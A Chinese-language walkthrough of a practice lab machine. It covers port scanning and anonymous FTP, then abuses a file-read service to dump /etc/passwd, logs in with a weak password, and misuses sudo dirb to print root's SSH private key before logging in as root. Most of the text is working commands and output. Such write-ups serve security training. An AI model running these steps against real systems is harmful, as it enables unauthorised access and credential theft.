# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 08:01 EDT
Nmap scan report for crack (192.168.2.9)
Host is up (0.00022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
4200/tcp  open  ssl/http ShellInABox
|_http-title: Shell In A Box
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=crack
| Not valid before: 2023-06-07T10:20:13
|_Not valid after:  2043-06-02T10:20:13
12359/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     File to read:NOFile to read:
|   NULL: 
|_    File to read:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port12359-TCP:V=7.95%I=7%D=10/13%Time=68ECEA18%P=x86_64-pc-linux-gnu%r(
SF:NULL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:NOF
SF:ile\x20to\x20read:");
MAC Address: 08:00:27:8A:AF:E6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms crack (192.168.2.9)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
```

# 漏洞利用

看一下12359端口是什么

```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.2.9 12359   
File to read:1.txt
NOFile to read:flag.txt
NOFile to read:^C
```

看一下21端口有什么

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.2.9  
Connected to 192.168.2.9.
220 (vsFTPd 3.0.3)
Name (192.168.2.9:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||18570|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||57486|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp> get crack.py
local: crack.py remote: crack.py
229 Entering Extended Passive Mode (|||8717|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |************************|   849        2.02 MiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (1.03 MiB/s)
┌──(kali㉿kali)-[~]
└─$ cat crack.py                      
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = "NO"
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = "/srv/ftp/upload/"+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,"r")
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass
```

这个脚本检查这个文件是否在ftp/​up­load和我输入的路径中存在，最终去读我输入的路径，那么只需要在ftp/​up­load中上传一个我想看的文件就可以读取了

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.2.9
Connected to 192.168.2.9.
220 (vsFTPd 3.0.3)
Name (192.168.2.9:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd upload
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||35426|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp> put passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||15445|)
150 Ok to send data.
100% |************************|     2       31.50 KiB/s    00:00 ETA
226 Transfer complete.
2 bytes sent in 00:00 (3.10 KiB/s)
┌──(kali㉿kali)-[~]
└─$ nc 192.168.2.9 12359
File to read:/etc/passwd
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']File to read:
```

4200端口登录，cris的密码就是cris

```
crack login: cris                                                                                                    
Password:                                                                                                            
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                             
                                                                                                                     
The programs included with the Debian GNU/Linux system are free software;                                            
the exact distribution terms for each program are described in the                                                   
individual files in /usr/share/doc/*/copyright.                                                                      
                                                                                                                     
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                    
permitted by applicable law.                                                                                         
Last login: Wed Jun  7 14:39:38 CEST 2023 from 192.168.0.100 on pts/0                                                
cris@crack:~$                                                                                                        
```

# 权限提升

看到可以无密码运行dirb，利用其读取root的私钥进行登录

```
cris@crack:~$ sudo -l                                                                                                
Matching Defaults entries for cris on crack:                                                                         
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin           
                                                                                                                     
User cris may run the following commands on crack:                                                                   
    (ALL) NOPASSWD: /usr/bin/dirb
cris@crack:~$ sudo dirb https://127.0.0.1:4200 /root/.ssh/id_rsa -v                                                  
                                                                                                                     
-----------------                                                                                                    
DIRB v2.22                                                                                                           
By The Dark Raver                                                                                                    
-----------------                                                                                                    
                                                                                                                     
START_TIME: Mon Oct 13 14:39:16 2025                                                                                 
URL_BASE: https://127.0.0.1:4200/                                                                                    
WORDLIST_FILES: /root/.ssh/id_rsa                                                                                    
OPTION: Show Not Existent Pages                                                                                      
                                                                                                                     
-----------------                                                                                                    
                                                                                                                     
GENERATED WORDS: 38
                                                                                                                     
---- Scanning URL: https://127.0.0.1:4200/ ----                                                                      
+ https://127.0.0.1:4200/-----BEGIN (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k (CODE:404|SIZE:356)
+ https://127.0.0.1:4200//+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ (CODE:200|SIZE:5215)
+ https://127.0.0.1:4200/a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl (CODE:404|SIZE:356)
+ https://127.0.0.1:4200//RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= (CODE:404|SIZE:356)
+ https://127.0.0.1:4200/-----END (CODE:404|SIZE:356)


-----------------                                                                                                    
END_TIME: Mon Oct 13 14:39:17 2025                                                                                   
DOWNLOADED: 38 - FOUND: 1                                          
cris@crack:/tmp$ ssh root@127.0.0.1 -i id_rsa                                                                        
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                             
                                                                                                                     
The programs included with the Debian GNU/Linux system are free software;                                            
the exact distribution terms for each program are described in the                                                   
individual files in /usr/share/doc/*/copyright.                                                                      
                                                                                                                     
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                    
permitted by applicable law.                                                                                         
Last login: Wed Jun  7 22:11:49 2023                                                                                 
root@crack:~# id                                                                                                     
uid=0(root) gid=0(root) grupos=0(root)                             
```
